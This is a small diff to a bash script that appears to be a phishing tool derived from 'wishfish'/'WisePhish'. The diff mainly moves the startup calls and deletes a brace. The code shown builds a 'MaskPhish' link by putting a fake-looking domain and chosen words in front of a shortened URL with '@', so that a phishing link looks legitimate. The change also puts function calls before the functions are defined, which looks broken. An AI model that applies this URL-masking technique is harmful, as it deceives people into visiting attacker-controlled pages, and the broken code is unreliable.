@@ -1,6 +1,9 @@
 #!/bin/bash
 # Inspired by: github.com/ALKR-HACKHECKZ/wishfish
 # Modified by: github.com/mjk11958/WisePhish
+banner
+dependencies
+start1
 
 trap 'printf "\n";stop' 2
 
@@ -231,7 +234,7 @@ checkfound
 
 
 if [[ $option_server -eq 3 ]]; then url_checker
-}
+
 
 url_checker() {
     if [ ! "${1//:*}" = http ]; then
@@ -272,10 +275,4 @@ read words
 echo -e "\nGenerating MaskPhish Link...\n"
 final=$mask-$words@$shorter
 echo -e "Here is the MaskPhish URL:\e[32m ${final} \e[0m\n"
-
 }
-
-banner
-dependencies
-start1
-
